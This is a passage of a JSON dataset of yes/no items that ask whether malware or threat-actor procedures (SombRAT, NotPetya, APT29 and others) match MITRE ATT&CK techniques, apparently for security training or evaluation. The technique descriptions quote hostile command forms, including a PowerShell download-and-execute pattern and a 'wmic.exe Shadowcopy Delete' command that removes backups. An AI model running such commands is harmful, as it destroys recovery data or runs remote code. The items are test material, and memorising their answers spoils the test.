    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Staged: Local Data Staging: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
      "question": "Is procedure SombRAT can store harvested data in a custom database under the %TEMP% directory.  related to technique Exploitation for Privilege Escalation",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel..\nAnswer in Yes or No.\n\nQuestion: Is procedure LightNeuron is capable of executing commands via cmd.exe. a type of technique System Network Configuration Discovery",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure LightNeuron is capable of executing commands via cmd.exe. a type of technique System Network Configuration Discovery",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Application Window Discovery: Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions..\nAnswer in Yes or No.\n\nQuestion: Is procedure njRAT gathers information about opened windows during the initial infection.  related to technique Application Window Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Window Discovery: Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
      "question": "Is procedure njRAT gathers information about opened windows during the initial infection.  related to technique Application Window Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Python: Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors..\nQ: Is procedure Bandook can support commands to execute Python-based payloads. a type of technique Command and Scripting Interpreter: Windows Command Shell.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Command and Scripting Interpreter: Python",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Python: Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
      "question": "Is procedure Bandook can support commands to execute Python-based payloads. a type of technique Command and Scripting Interpreter: Windows Command Shell",
      "yes/no": "No.\nThe provided context is related to Command and Scripting Interpreter: Python",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Dtrack\u2019s can download and upload a file to the victim\u2019s computer. a type of technique Ingress Tool Transfer.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "question": "Is procedure Dtrack\u2019s can download and upload a file to the victim\u2019s computer. a type of technique Ingress Tool Transfer",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure APT5 has used legitimate account credentials to move laterally through compromised environments.  related to technique Search Open Websites/Domains: Search Engines.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Valid Accounts: Domain Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Valid Accounts: Domain Accounts: Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
      "question": "Is procedure APT5 has used legitimate account credentials to move laterally through compromised environments.  related to technique Search Open Websites/Domains: Search Engines",
      "yes/no": "No.\nThe provided context is related to Valid Accounts: Domain Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Valid Accounts: Cloud Accounts: Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods..\nAnswer in Yes or No.\n\nQuestion: Is procedure Pacu leverages valid cloud accounts to perform most of its operations.  related to technique Unsecured Credentials: Cloud Instance Metadata API",
    "context": "",
    "output": "No.\nThe provided context is correlated with Valid Accounts: Cloud Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Valid Accounts: Cloud Accounts: Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.",
      "question": "Is procedure Pacu leverages valid cloud accounts to perform most of its operations.  related to technique Unsecured Credentials: Cloud Instance Metadata API",
      "yes/no": "No.\nThe provided context is correlated with Valid Accounts: Cloud Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background User Execution: Malicious Link: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File..\nQ: Is procedure FIN8 has used emails with malicious links to lure victims into installing malware.  related to technique Indicator Removal: Timestomp.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is User Execution: Malicious Link",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "User Execution: Malicious Link: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "question": "Is procedure FIN8 has used emails with malicious links to lure victims into installing malware.  related to technique Indicator Removal: Timestomp",
      "yes/no": "No.\nThe correct answer is User Execution: Malicious Link",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites. a type of technique Archive Collected Data: Archive via Library.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Exploit Public-Facing Application: Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets. Depending on the flaw being exploited this may also involve Exploitation for Defense Evasion or Exploitation for Client Execution.\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",
      "question": "Is procedure APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites. a type of technique Archive Collected Data: Archive via Library",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure OSX/Shlayer has used the command <code>appDir=\"$(dirname $(dirname \"$currentDir\"))\"</code> and <code>$(dirname \"$(pwd -P)\")</code> to construct installation paths.  related to technique File and Directory Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure OSX/Shlayer has used the command <code>appDir=\"$(dirname $(dirname \"$currentDir\"))\"</code> and <code>$(dirname \"$(pwd -P)\")</code> to construct installation paths.  related to technique File and Directory Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Meteor can use `wmic.exe` as part of its effort to delete shadow copies.  related to technique Boot or Logon Autostart Execution: Shortcut Modification.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Windows Management Instrumentation",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Windows Management Instrumentation: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
      "question": "Is procedure Meteor can use `wmic.exe` as part of its effort to delete shadow copies.  related to technique Boot or Logon Autostart Execution: Shortcut Modification",
      "yes/no": "No.\nThe provided context is correlated with Windows Management Instrumentation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure OutSteel can identify running processes on a compromised host. a type of technique Obfuscated Files or Information: Indicator Removal from Tools.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Process Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Process Discovery: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "question": "Is procedure OutSteel can identify running processes on a compromised host. a type of technique Obfuscated Files or Information: Indicator Removal from Tools",
      "yes/no": "No.\nThe provided context is related to Process Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Native API: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools..\nQ: Is procedure ADVSTORESHELL is capable of starting a process using CreateProcess. a type of technique Audio Capture.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Native API",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Native API: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "question": "Is procedure ADVSTORESHELL is capable of starting a process using CreateProcess. a type of technique Audio Capture",
      "yes/no": "No.\nThe correct answer is Native API",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access..\nQ: Is procedure POORAIM can conduct file browsing. a type of technique File and Directory Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure POORAIM can conduct file browsing. a type of technique File and Directory Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Pysa has executed a malicious executable by naming it svchost.exe. a type of technique Exfiltration Over C2 Channel",
    "context": "",
    "output": "No.\nThe provided context is correlated with Masquerading: Match Legitimate Name or Location",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Masquerading: Match Legitimate Name or Location: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "question": "Is procedure Pysa has executed a malicious executable by naming it svchost.exe. a type of technique Exfiltration Over C2 Channel",
      "yes/no": "No.\nThe provided context is correlated with Masquerading: Match Legitimate Name or Location",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Cloud API: Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as Python.  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment..\nQ: Is procedure APT29 has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API  related to technique Command and Scripting Interpreter: Windows Command Shell.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Command and Scripting Interpreter: Cloud API",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Cloud API: Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as Python.  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.",
      "question": "Is procedure APT29 has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API  related to technique Command and Scripting Interpreter: Windows Command Shell",
      "yes/no": "No.\nThe correct answer is Command and Scripting Interpreter: Cloud API",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Obtain Capabilities: Malware: Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries)..\nQ: Is procedure TA2541 has used multiple strains of malware available for purchase on criminal forums or in open-source repositories. a type of technique Obtain Capabilities: Malware.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obtain Capabilities: Malware: Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
      "question": "Is procedure TA2541 has used multiple strains of malware available for purchase on criminal forums or in open-source repositories. a type of technique Obtain Capabilities: Malware",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Data Encoding: Non-Standard Encoding: Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request..\nAnswer in Yes or No.\n\nQuestion: Is procedure Bankshot encodes commands from the control server using a range of characters and gzip.  related to technique Valid Accounts: Domain Accounts",
    "context": "",
    "output": "No.\nThe provided context is correlated with Data Encoding: Non-Standard Encoding",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Encoding: Non-Standard Encoding: Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.",
      "question": "Is procedure Bankshot encodes commands from the control server using a range of characters and gzip.  related to technique Valid Accounts: Domain Accounts",
      "yes/no": "No.\nThe provided context is correlated with Data Encoding: Non-Standard Encoding",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure NotPetya creates a task to reboot the system one hour after infection. a type of technique Scheduled Task/Job: Scheduled Task.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
